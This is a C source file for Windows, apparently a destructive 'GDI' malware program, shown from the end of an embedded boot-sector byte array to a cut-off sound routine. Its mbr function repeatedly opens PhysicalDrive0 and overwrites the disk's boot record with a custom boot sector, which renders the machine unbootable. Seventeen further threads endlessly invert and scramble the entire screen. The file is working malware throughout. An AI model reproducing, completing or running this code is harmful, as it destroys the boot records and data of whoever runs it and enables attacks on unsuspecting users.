  0x62, 0x61, 0x6c, 0x6c, 0x20, 0x6f, 0x6e, 0x20, 0x73, 0x63, 0x72, 0x65,
  0x65, 0x6e, 0x0a, 0x09, 0x3b, 0x0a, 0x6c, 0x6f, 0x63, 0x61, 0x74, 0x65,
  0x5f, 0x62, 0x61, 0x6c, 0x6c, 0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20,
  0x61, 0x6c, 0x2c, 0x30, 0x78, 0x61, 0x30, 0x0a, 0x09, 0x6d, 0x75, 0x6c,
  0x20, 0x61, 0x68, 0x09, 0x09, 0x09, 0x3b, 0x20, 0x41, 0x48, 0x20, 0x3d,
  0x20, 0x59, 0x20, 0x63, 0x6f, 0x6f, 0x72, 0x64, 0x69, 0x6e, 0x61, 0x74,
  0x65, 0x20, 0x28, 0x72, 0x6f, 0x77, 0x29, 0x0a, 0x09, 0x6d, 0x6f, 0x76,
  0x20, 0x62, 0x6c, 0x2c, 0x62, 0x68, 0x09, 0x09, 0x3b, 0x20, 0x42, 0x48,
  0x20, 0x3d, 0x20, 0x58, 0x20, 0x63, 0x6f, 0x6f, 0x72, 0x64, 0x69, 0x6e,
  0x61, 0x74, 0x65, 0x20, 0x28, 0x63, 0x6f, 0x6c, 0x75, 0x6d, 0x6e, 0x29,
  0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x62, 0x68, 0x2c, 0x30, 0x0a, 0x09,
  0x73, 0x68, 0x6c, 0x20, 0x62, 0x78, 0x2c, 0x31, 0x0a, 0x09, 0x61, 0x64,
  0x64, 0x20, 0x62, 0x78, 0x2c, 0x61, 0x78, 0x0a, 0x09, 0x72, 0x65, 0x74,
  0x0a, 0x0a, 0x09, 0x3b, 0x0a, 0x09, 0x3b, 0x20, 0x55, 0x70, 0x64, 0x61,
  0x74, 0x65, 0x20, 0x73, 0x63, 0x6f, 0x72, 0x65, 0x20, 0x69, 0x6e, 0x64,
  0x69, 0x63, 0x61, 0x74, 0x6f, 0x72, 0x20, 0x28, 0x66, 0x72, 0x6f, 0x6d,
  0x20, 0x62, 0x6f, 0x6f, 0x74, 0x52, 0x6f, 0x67, 0x75, 0x65, 0x29, 0x0a,
  0x09, 0x3b, 0x0a, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65, 0x5f, 0x73, 0x63,
  0x6f, 0x72, 0x65, 0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x62, 0x78,
  0x2c, 0x30, 0x78, 0x30, 0x66, 0x39, 0x38, 0x09, 0x09, 0x3b, 0x20, 0x50,
  0x6f, 0x69, 0x6e, 0x74, 0x20, 0x74, 0x6f, 0x20, 0x62, 0x6f, 0x74, 0x74,
  0x6f, 0x6d, 0x20, 0x72, 0x69, 0x67, 0x68, 0x74, 0x20, 0x63, 0x6f, 0x72,
  0x6e, 0x65, 0x72, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x78, 0x2c,
  0x5b, 0x62, 0x70, 0x2b, 0x73, 0x63, 0x6f, 0x72, 0x65, 0x5d, 0x0a, 0x09,
  0x63, 0x61, 0x6c, 0x6c, 0x20, 0x2e, 0x31, 0x0a, 0x09, 0x6d, 0x6f, 0x76,
  0x20, 0x61, 0x6c, 0x2c, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c,
  0x73, 0x5d, 0x0a, 0x2e, 0x31, 0x3a, 0x0a, 0x09, 0x78, 0x6f, 0x72, 0x20,
  0x63, 0x78, 0x2c, 0x63, 0x78, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3b, 0x20, 0x43, 0x58, 0x20,
  0x3d, 0x20, 0x51, 0x75, 0x6f, 0x74, 0x69, 0x65, 0x6e, 0x74, 0x0a, 0x2e,
  0x32, 0x3a, 0x09, 0x69, 0x6e, 0x63, 0x20, 0x63, 0x78, 0x0a, 0x09, 0x73,
  0x75, 0x62, 0x20, 0x61, 0x78, 0x2c, 0x31, 0x30, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3b, 0x20,
  0x44, 0x69, 0x76, 0x69, 0x73, 0x69, 0x6f, 0x6e, 0x20, 0x62, 0x79, 0x20,
  0x73, 0x75, 0x62, 0x74, 0x72, 0x61, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x0a,
  0x09, 0x6a, 0x6e, 0x63, 0x20, 0x2e, 0x32, 0x0a, 0x09, 0x61, 0x64, 0x64,
  0x20, 0x61, 0x78, 0x2c, 0x30, 0x78, 0x30, 0x61, 0x33, 0x61, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3b, 0x20, 0x43, 0x6f,
  0x6e, 0x76, 0x65, 0x72, 0x74, 0x20, 0x72, 0x65, 0x6d, 0x61, 0x69, 0x6e,
  0x64, 0x65, 0x72, 0x20, 0x74, 0x6f, 0x20, 0x41, 0x53, 0x43, 0x49, 0x49,
  0x20, 0x64, 0x69, 0x67, 0x69, 0x74, 0x20, 0x2b, 0x20, 0x63, 0x6f, 0x6c,
  0x6f, 0x72, 0x0a, 0x09, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x2e, 0x33, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x3b, 0x20, 0x50, 0x75, 0x74, 0x20, 0x6f, 0x6e, 0x20,
  0x73, 0x63, 0x72, 0x65, 0x65, 0x6e, 0x0a, 0x09, 0x78, 0x63, 0x68, 0x67,
  0x20, 0x61, 0x78, 0x2c, 0x63, 0x78, 0x0a, 0x09, 0x64, 0x65, 0x63, 0x20,
  0x61, 0x78, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3b, 0x20, 0x51, 0x75, 0x6f,
  0x74, 0x69, 0x65, 0x6e, 0x74, 0x20, 0x69, 0x73, 0x20, 0x7a, 0x65, 0x72,
  0x6f, 0x3f, 0x0a, 0x09, 0x6a, 0x6e, 0x7a, 0x20, 0x2e, 0x31, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x3b, 0x20, 0x4e, 0x6f, 0x2c, 0x20, 0x6a, 0x75, 0x6d,
  0x70, 0x20, 0x74, 0x6f, 0x20, 0x73, 0x68, 0x6f, 0x77, 0x20, 0x6d, 0x6f,
  0x72, 0x65, 0x20, 0x64, 0x69, 0x67, 0x69, 0x74, 0x73, 0x2e, 0x0a, 0x0a,
  0x2e, 0x33, 0x3a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x5b, 0x62, 0x78, 0x5d,
  0x2c, 0x61, 0x78, 0x0a, 0x09, 0x64, 0x65, 0x63, 0x20, 0x62, 0x78, 0x0a,
  0x09, 0x64, 0x65, 0x63, 0x20, 0x62, 0x78, 0x0a, 0x09, 0x72, 0x65, 0x74,
  0x0a, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x25, 0x69, 0x66, 0x64, 0x65, 0x66,
  0x20, 0x63, 0x6f, 0x6d, 0x5f, 0x66, 0x69, 0x6c, 0x65, 0x0a, 0x20, 0x20,
  0x20, 0x20, 0x25, 0x65, 0x6c, 0x73, 0x65, 0x0a, 0x09, 0x74, 0x69, 0x6d,
  0x65, 0x73, 0x20, 0x35, 0x31, 0x30, 0x2d, 0x28, 0x24, 0x2d, 0x24, 0x24,
  0x29, 0x20, 0x64, 0x62, 0x20, 0x30, 0x78, 0x34, 0x66, 0x0a, 0x09, 0x64,
  0x62, 0x20, 0x30, 0x78, 0x35, 0x35, 0x2c, 0x30, 0x78, 0x61, 0x61, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3b, 0x20,
  0x4d, 0x61, 0x6b, 0x65, 0x20, 0x69, 0x74, 0x20, 0x61, 0x20, 0x62, 0x6f,
  0x6f, 0x74, 0x61, 0x62, 0x6c, 0x65, 0x20, 0x73, 0x65, 0x63, 0x74, 0x6f,
  0x72, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x25, 0x65, 0x6e, 0x64, 0x69, 0x66,
  0x0a
};

DWORD WINAPI mbr(LPVOID lpParam) {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}

DWORD WINAPI OldShader1(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		RGBQUAD rgbquad;
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0)
				v = rand() % 2;
			int vide = rand() % 3;
			int x = i % w, y = i / w;
			int Xii = x + x + i, Yii = y + y + i;
			*((BYTE*)data + 4 * i + x + y + vide) = *((BYTE*)(data + x + y));
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI Plgblt(LPVOID lpParam) {
	int inc = 1;
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		HDC hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 200;
		wPt[0].y = wRect.top - 100;
		wPt[1].x = wRect.right + rand() % 100;
		wPt[1].y = wRect.top - rand() % 100;
		wPt[2].x = wRect.left - rand() % 100;
		wPt[2].y = wRect.bottom + rand() % 100;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
	}
}

DWORD WINAPI Shader1(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii - Yii;
			//data[i].rgb -= Xii ^ Yii | x * y;
			//data[i].rgb -= Xii - i | Yii - i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI Shader2(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			//data[i].rgb -= Xii - Yii;
			data[i].rgb -= Xii ^ Yii | x * y;
			//data[i].rgb -= Xii - i | Yii - i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI Shader3(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			//data[i].rgb -= Xii - Yii;
			//data[i].rgb -= Xii ^ Yii | x * y;
			data[i].rgb -= Xii - i | Yii - i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader4(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii - Yii;
			data[i].rgb -= Xii ^ Yii | x * y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader5(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii ^ Yii | x * y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader6(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii ^ Yii | x | y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader7(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii - Yii;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader8(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			//data[i].rgb -= Xii - Yii;
			data[i].rgb -= Xii & Yii | x * y;
			//data[i].rgb -= Xii - i | Yii - i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader9(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii - i & Yii - i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader10(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii - i - Yii - i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader11(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii - i + Yii - i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader12(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii | Yii - x * y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader13(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii & Yii - x * y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader14(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii | Yii & x + y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader15(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			data[i].rgb -= Xii | Yii * x * y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader16(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		StretchBlt(hdcdc, 0, 0, w, h, desk, 0, 0, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int Xii = x * x + i;
			int Yii = y * y + i;
			//data[i].rgb -= Xii | Yii;
			data[i].rgb -= Xii - Yii | x - y;
			data[i].rgb -= Xii - i | Yii - i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader17(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (x + y) * RGB(GetRValue(Hue(239)), GetGValue(Hue(239)), GetBValue(Hue(239)))/**/;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
